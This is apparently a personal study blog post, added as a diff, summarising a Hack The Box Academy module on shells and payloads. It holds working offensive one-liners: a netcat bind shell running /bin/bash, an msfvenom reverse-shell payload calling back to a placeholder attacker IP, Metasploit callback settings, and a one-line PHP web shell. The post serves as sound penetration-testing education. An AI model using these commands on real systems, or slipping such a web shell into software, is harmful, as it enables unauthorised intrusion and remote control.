@@ -1,0 +1,328 @@
+---
+
+title: "Shells & Payloads: What I Learned"
+date: 2026-08-17
+----------------
+
+# Shells & Payloads: What I Learned
+
+Today I finished studying the **Shells & Payloads** module in Hack The Box Academy.
+
+The module helped me understand how attackers gain command execution on a target, establish different types of shells, generate payloads, and improve limited shell sessions.
+
+The main topics I learned were:
+
+* Bind shells
+* Reverse shells
+* Payloads and MSFvenom
+* Metasploit
+* Windows and Linux shells
+* Spawning interactive shells
+* Web shells
+
+---
+
+## Bind Shells
+
+A bind shell makes the **target machine listen on a port**.
+
+The attacker then connects directly to that port and receives a shell.
+
+The basic flow is:
+
+```text
+Target listens → Attacker connects → Shell established
+```
+
+For example, the target could start a listener:
+
+```bash
+nc -lvnp 7777 -e /bin/bash
+```
+
+Then the attacker connects:
+
+```bash
+nc <TARGET_IP> 7777
+```
+
+One disadvantage of a bind shell is that the target must allow incoming connections to the listening port.
+
+---
+
+## Reverse Shells
+
+A reverse shell works in the opposite direction.
+
+The attacker starts a listener, and the target connects back to the attacker's machine.
+
+```text
+Attacker listens → Target connects back → Shell established
+```
+
+The attacker can start a Netcat listener:
+
+```bash
+nc -lvnp 7777
+```
+
+Then a command executed on the target initiates the connection back.
+
+Reverse shells are especially useful because outbound connections are often easier to establish than inbound connections.
+
+---
+
+## Payloads
+
+A payload is the code or command executed after successfully exploiting a target.
+
+Payloads can perform different actions, such as:
+
+* Opening a command shell
+* Creating a reverse shell
+* Creating a bind shell
+* Starting a Meterpreter session
+
+I also learned the difference between **staged** and **stageless** payloads.
+
+### Staged Payload
+
+A staged payload first sends a small initial component that retrieves the remaining payload.
+
+```text
+Initial stage → Download additional stage → Full session
+```
+
+### Stageless Payload
+
+A stageless payload contains everything needed in one payload.
+
+```text
+Full payload → Execute → Session
+```
+
+---
+
+## Metasploit
+
+Metasploit provides a framework for selecting exploits, configuring payloads, and interacting with compromised systems.
+
+A basic workflow looks like:
+
+```bash
+msfconsole
+```
+
+Search for an exploit:
+
+```bash
+search <service-or-vulnerability>
+```
+
+Select it:
+
+```bash
+use <module>
+```
+
+Check the required options:
+
+```bash
+show options
+```
+
+Configure the target:
+
+```bash
+set RHOSTS <TARGET_IP>
+set RPORT <TARGET_PORT>
+```
+
+Configure the callback information when using a reverse shell:
+
+```bash
+set LHOST <ATTACKER_IP>
+set LPORT 4444
+```
+
+Then run the exploit:
+
+```bash
+run
+```
+
+or:
+
+```bash
+exploit
+```
+
+Depending on the payload, a successful exploit may provide a standard shell or a Meterpreter session.
+
+---
+
+## MSFvenom
+
+MSFvenom can generate payloads for different operating systems and file formats.
+
+For example:
+
+```bash
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f elf -o shell.elf
+```
+
+The important options are:
+
+```text
+-p    Payload
+LHOST Attacker IP
+LPORT Attacker listening port
+-f    Output format
+-o    Output file
+```
+
+MSFvenom can generate payloads for Windows, Linux, web applications, and many other environments.
+
+---
+
+## Windows Shells
+
+Windows commonly provides two command environments:
+
+```text
+cmd.exe
+PowerShell
+```
+
+`cmd.exe` provides traditional Windows command-line functionality.
+
+PowerShell provides a much more powerful scripting environment and can interact with the operating system, files, processes, networking, and .NET components.
+
+Understanding both is important because the available shell depends on the target environment.
+
+---
+
+## Linux and Unix Shells
+
+Linux systems commonly provide shells such as:
+
+```text
+/bin/sh
+/bin/bash
+```
+
+After gaining command execution, the initial shell may be very limited.
+
+For example, commands may work, but features such as tab completion, command history, and interactive programs may not behave correctly.
+
+---
+
+## Spawning an Interactive Shell
+
+One important technique I practiced was upgrading a limited shell into a more interactive shell.
+
+If Python is installed, a TTY can be spawned with:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+or:
+
+```bash
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+This provides a more usable terminal and makes interacting with the target much easier.
+
+I also learned that other interpreters can sometimes be used when Python is unavailable.
+
+---
+
+## Web Shells
+
+A web shell is a server-side script that allows commands to be executed through a web server.
+
+For example, a simple PHP command execution shell could use:
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+After uploading the file to a vulnerable web application, commands could be passed through the URL:
+
+```text
+shell.php?cmd=whoami
+```
+
+The web server executes the command and returns the output.
+
+During the module, I practiced working with PHP-based web shells and learned how file upload vulnerabilities can sometimes provide command execution on the underlying server.
+
+---
+
+## From a Web Shell to a Better Shell
+
+A web shell is useful, but it can be inconvenient because commands are usually executed one request at a time.
+
+A common progression is:
+
+```text
+File Upload Vulnerability
+        ↓
+Web Shell
+        ↓
+Command Execution
+        ↓
+Reverse Shell
+        ↓
+Interactive Shell
+```
+
+This helped me understand that getting initial command execution is often only the first step.
+
+The goal is usually to obtain a more stable and interactive shell.
+
+---
+
+## Quick Workflow
+
+A general shell workflow I learned looks like this:
+
+```text
+1. Identify a vulnerability or command execution method
+
+2. Choose the appropriate shell or payload
+
+3. Start a listener if using a reverse shell
+
+4. Deliver or execute the payload
+
+5. Receive the shell
+
+6. Identify the operating system and environment
+
+7. Upgrade the shell if necessary
+
+8. Continue enumeration
+```
+
+---
+
+## Key Takeaways
+
+The biggest takeaway from this module was that there is no single method for gaining a shell.
+
+The technique depends on the target operating system, available tools, network restrictions, application vulnerabilities, and the type of access obtained.
+
+I also learned that there is an important difference between simply executing commands and having a stable interactive shell.
+
+Understanding bind shells, reverse shells, payload generation, web shells, and shell upgrades provides a strong foundation for later penetration testing and post-exploitation techniques.
+
+---
+
+## Reference
+
+Hack The Box Academy — **Shells & Payloads**
+
+This post is a summary of concepts and techniques I practiced while completing the module.
